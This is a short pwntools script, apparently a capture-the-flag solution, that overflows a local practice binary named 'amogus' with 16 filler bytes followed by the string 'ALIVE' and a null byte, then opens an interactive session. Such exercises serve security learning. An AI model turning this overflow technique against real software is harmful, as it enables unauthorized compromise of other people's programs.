from pwn import *

p = process('./amogus')

payload = b'A'*16 + b'ALIVE\x00'

p.sendline(payload)
p.interactive()
